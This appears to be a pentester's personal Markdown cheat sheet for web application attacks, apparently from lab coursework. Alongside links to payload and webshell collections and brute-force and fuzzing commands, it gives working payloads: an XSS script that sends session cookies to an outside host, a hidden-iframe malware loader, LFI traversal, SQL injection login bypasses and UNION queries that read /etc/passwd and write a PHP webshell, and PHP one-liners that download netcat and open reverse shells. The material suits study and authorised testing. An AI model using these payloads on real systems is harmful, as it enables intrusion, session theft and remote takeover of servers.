## Web Exploits
- [GitHub - swisskyrepo/PayloadsAllTheThings: A list of useful payloads and bypass for Web Application Security and Pentest/CTF](https://github.com/swisskyrepo/PayloadsAllTheThings/)
- [IIS - Web.config File Exploit &middot; KSEC ARK](https://www.ivoidwarranties.tech/posts/pentesting-tuts/iis/web-config/) - IIS 7+

## Webshells
[GitHub - tennc/webshell: This is a webshell open source project](https://github.com/tennc/webshell)
[GitHub - xl7dev/WebShell: Webshell && Backdoor Collection](https://github.com/xl7dev/WebShell)
## OWASP
[Category:OWASP WebGoat Project - OWASP](https://www.owasp.org/index.php/Category:OWASP_WebGoat_Project)
[OWASP Testing Guide v4 Table of Contents - OWASP](https://www.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents)

[Web Application Penetration Testing - OWASP](https://www.owasp.org/index.php/Web_Application_Penetration_Testing)

- `nikito` web vulnerability scanner
- `nikito -host 10.11.1.71` 

- `cadaver` - WebDAV client, allows you you upload files to webdav servers

### lists
`/usr/share/seclists/Discovery/Web_Content/CGIs.txt`
`/usr/share/seclists/Discovery/Web_Content/common.txt`
[DistrosDefaultLayout - Httpd Wiki](https://wiki.apache.org/httpd/DistrosDefaultLayout#Debian.2C_Ubuntu_.28Apache_httpd_2.x.29)

### curl

`-G, --get   Put the post data in the URL and use GET`

`-k, --insecure      Allow insecure server connections when using SSL`

` -o, --output <file> Write to file instead of stdout`

```
-d, --data <data>   HTTP POST data
    --data-ascii <data> HTTP POST ASCII data
    --data-binary <data> HTTP POST binary data
    --data-raw <data> HTTP POST data, '@' allowed
    --data-urlencode <data> HTTP POST data url encoded
```

### webdev
`cadaver`

### DirBuster 
- tool to enumerate web applications

[greenoperator — DirBuster commandline interface](https://greenoperator.tumblr.com/post/10209760598/dirbuster-commandline-interface)
Little known to most DirBuster does provide a commandline interface (cli) since version 0.12.  The options for this are shown below.

```
DirBuster - 0.12  
Usage: java -jar DirBuster-0.12 -u <URL http://example.com/ [Options\]

  Options:  
    -h : Display this help message  
    -H : Start DirBuster in headless mode (no gui), report will be auto saved on exit  
    -l <Word list to use> : The Word list to use for the list based brute force. Default: <userdirectory>/directory-list-2.3-small.txt"  
    -g : Only use GET requests. Default Not Set  
    -e <File Extention list> : File Extention list eg asp,aspx. Default: php  
    -t <Number of Threads> : Number of connection threads to use. Default: 10  
    -s <Start point> : Start point of the scan. Default: /  
    -v : Verbose output, Default: Not set  
    -P : Don’t Parse html, Default: Not Set  
    -R : Don’t be recursive, Default: Not Set  
    -r <location> : File to save report to. Default: <userdirectory>/DirBuster-Report-\[hostname\]-\[port\].txt
```
Examples:

Run DirBuster in headless mode  
`java -jar DirBuster-0.12.jar -H -u https://www.target.com/`

Start GUI with target file prepopulated  
`java -jar DirBuster-0.12.jar -u https://www.target.com/`

### gobuster
- like dir buster
`gobuster -u http://10.11.1.71/ -w /usr/share/seclists/Discovery/Web-Content/cgis.txt -s '200,204,403,500' -e`

### hydra bruite focing

- Use a HTTP proxy
`HYDRA_PROXY_HTTP=http://10.11.1.252:8888 hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt 127.0.0.1 -s 10443 -m /manage/dashboard https-get`

### wfuzz
`wfuzz -c -z range,1-65000 http://10.0.0.3:port/usl?param=FUZZ`
`--hl=2 ` - limit number of return chars

### Cross site scripting 
Uses in sanitized input to inject code into a page, usually Javascript or other code that is parsed by the browser

`<script>stuff</script>`

- Create invisable iframe to run a bad site
`<iframe SRC="http://192.168.54.5:81/malware" height="0" width="0"></iframe>`

[XSS Filter Evasion Cheat Sheet - OWASP](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)


#### Session cookie stealing
the code below will collect the php session cookie from the clinet browser and send a request to a malitious URL to collect the cookie

```
<script>
new Image().src="http://10.11.0.5/bogus.php?output="+document.cookie;
</script>
```

#### Local files inclusion (LFI)

Un checked variables that directly reference files in the file system and be used to traverse the local file system

`http://10.11.16.115/addguestbook.php?name=blah&comment=sucker&LANG=../../../../../../windows/system32/drivers/etc/hosts%00`

you can use `%00` to terminate the string to block any suffixes that maybe appended

you can send raw php commands to the apache server that will be written to the access log and reading the access log will execute those php commands running arbitrary commands on the server.

##### Log file 

#### Remote file inclusion (RFI)

simlar to LFI only uses a remote URL to pull in the PHP code

## SQL injection

[From SQL Injection to WebShell \| RSA Link](https://community.rsa.com/community/products/netwitness/blog/2017/04/10/from-sql-injection-to-webshell)
[Anatomy of an attack: Gaining Reverse Shell from SQL injection](https://resources.infosecinstitute.com/anatomy-of-an-attack-gaining-reverse-shell-from-sql-injection/)
[Pentesterlab — From SQL Injection to Shell — Walkthrough](https://medium.com/@Kan1shka9/pentesterlab-from-sql-injection-to-shell-walkthrough-7b70cd540bc8)
[SQL Injection Attacks - SQL Injection](http://www.sqlinjection.net/category/attacks/)
[](https://defcon.org/images/defcon-17/dc-17-presentations/defcon-17-joseph_mccray-adv_sql_injection.pdf)
[SQL Injection \| pentestmonkey](http://pentestmonkey.net/category/cheat-sheet/sql-injection)
[MSSQL Injection Cheat Sheet \| pentestmonkey](http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)


`select * from users where name='wronguser' or 1=1 LIMIT 1;# and password='wrongpass';`

`wronguser' or 1=1 LIMIT 1;#` is entered in the username field to inject those commands into the DB query returning a true result bypassing normal authentication.

### Blind SQLi

[Blind SQL Injection 1.0 - Attack Anatomy](https://resources.infosecinstitute.com/blind-sql-injection/)
[Blind SQL Injection - OWASP](https://www.owasp.org/index.php/Blind_SQL_Injection)


#### Time based

[Time-Based Blind SQL Injection Attacks](http://www.sqlinjection.net/time-based/)
Time-based techniques are often used to achieve tests when there is no other way to retrieve information from the database server. This kind of attack injects a SQL segment which contains specific DBMS function or heavy query that generates a time delay. Depending on the time it takes to get the server response, it is possible to deduct some information. As you can guess, this type of inference approach is particularly useful for blind and deep blind SQL injection attacks.

### SQL DB eumeration

You can place a single or double quote into a field and see if it returns an error

The ` order by #` command can be used to enumerate the number of columns incementing by 1 until an error is displayed. 

This is important only the max number of columns can be displayed at once

` union all select 1,2,3,4,5,6` this will return 6 columns for databases that only have 6 columns returned. The numbers in this query can be replaced with SQL commands to return a column of data. this will also show which columns are displayed on screen.

The displyed numbers can be replaced with SQL commands to expose data. 

` union all select 1,2,3,4,@@version,6` 
or 
` union all select 1,2,3,4,table_name,6 from information_schema.tables`

### SQL tool box

`wronguser' or 1=1 LIMIT 1;#` - test username

`union all` - combine all SELECT queries 

`sqlmap` - automated tool to seach for sql injection attacks

#### mysql

[MySQL SQL Injection Cheat Sheet \| pentestmonkey](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)

`@@version`
`@@hostname`
`@@datadir`
`user()`
`concat(val,val, val...)` - concatate value from mulitple columns into one result

columns in `information_schema.tables`
- `table_name`

columns in `information_schema.columns`
- `column_name`
- `WHERE table_name=taget`

`load_file('')` 
`into OUTFILE 'filename'` - writes file to file system
`‘ UNION SELECT 1, load_file(/etc/passwd) #`
`‘ union select 1,’‘ INTO OUTFILE ‘/var/www/dvwa/cmd.php’ #`
`union select “<? system($_REQUEST\[‘cmd’\]); ?>”,2,3 INTO OUTFILE ‘/var/www/test/execcmd.php’#`

### MS SQL


`--` - comment

`admin' or 1=1;---` - login bypass

- [SQL Injection Attacks by Example](http://www.unixwiz.net/techtips/sql-injection.html)
- [MSSQL Injection Cheat Sheet | pentestmonkey](http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)

### PHP Tool box

`php -a` - interactive php shell
`php -S LHOST:LPORT -t .` - PHP test server

`php://filter/convert.base64encode/resource=FILENAME` - convert file to base64 to prevent execution of php code

[PHP: php:// - Manual ](https://www.php.net/manual/en/wrappers.php.php)

```
php://filter
php://input
```

do not use double quotes they may be escaped in the logs

`var .= 'text'` - append to variable
`var = 'text'.PHP_EOL` - add platform appropriate line break to text

`$_GET['URLVAR']` - collect value from URLVAR URL query parameter and place here

*Write files to file system*
Modes
'w' - Create new / Overwrite file
'a' - append to file

`<?php $myfile = fopen('/newfile.txt', 'w'); $txt = 'Jane Doe'.PHP_EOL; $txt .= 'John Doe'.PHP_EOL; fwrite($myfile, $txt); fclose($myfile); ?>`

`<?php $myfile = file_get_contents('/etc/passwd'); echo $myfile; ?>`

*Run command*
`<?php echo shell_exec($_GET['cmd']); ?>`

`<?php echo shell_exec($_GET['tftp 10.11.0.180 nc.exe /nc.exe']); ?>`

`<?php echo shell_exec('tftp -i 10.11.0.180 get nc.exe /nc.exe'); echo shell_exec('\nc -nv 10.11.0.180 4444 -e cmd.exe'); ?>`

`<?php echo shell_exec('/bin/bash -i >& /dev/tcp/10.11.0.52/443 0>&1'); ?>`

*phpinfo*

- https://github.com/D35m0nd142/Kadabra/blob/master/phpinfo.py
- [PHP : Winning the race condition vs Temporary File Upload - PHPInfo() exploit  · GitHub](https://gist.github.com/intrd/35483ae252c66ee3d11f7acfa7379749)
- https://insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf

## tomcat

admin UI - `/manager/html/`

## Coldfusion

- [[TUTORIAL] ColdFusion Exploit - Hack Big Sites With Ease! | UltimatePeter.com](https://ultimatepeter.com/tutorial-coldfusion-exploit-hack-big-sites-with-ease/)
- [ColdFusion 8.0.1 Arbitrary File Upload and Execute | Rapid7](https://www.rapid7.com/db/modules/exploit/windows/http/coldfusion_fckeditor)
- https://www.carnal0wnage.com/papers/LARES-ColdFusion.pdf
- https://security-assessment.com/files/advisories/2010-02-22_Multiple_Adobe_Products-XML_External_Entity_and_XML_Injection.pdf
